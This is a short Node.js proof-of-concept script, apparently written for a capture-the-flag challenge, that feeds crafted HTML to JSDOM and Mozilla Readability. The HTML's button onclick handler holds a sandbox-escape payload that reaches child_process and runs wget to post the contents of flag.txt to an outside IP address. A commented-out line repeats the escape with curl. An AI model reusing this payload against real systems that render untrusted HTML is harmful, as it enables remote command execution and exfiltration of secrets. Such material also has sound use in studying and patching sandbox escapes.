const { JSDOM } = require("jsdom");
const { Readability } = require("@mozilla/readability");


let html = `
<html>
<body>
<button 
 class="nextpoc" onclick="constructor.constructor('return process')().mainModule.require('child_process').execSync('wget -q -O- 120.27.246.202 --post-data $(cat flag.txt)').toString();">
POC
</button>
Here's bunch of text;
</body>
</html>`


const readerify = (dom) => {
    return (new Readability(dom.window.document.cloneNode(true))).parse();
};

let dom = new JSDOM(html);
let article = readerify(dom);
console.log(article);
//dom.window.eval(`constructor.constructor('return process')().mainModule.require('child_process').execSync('curl 127.0.0.1').toString();`);
//console.log(dom);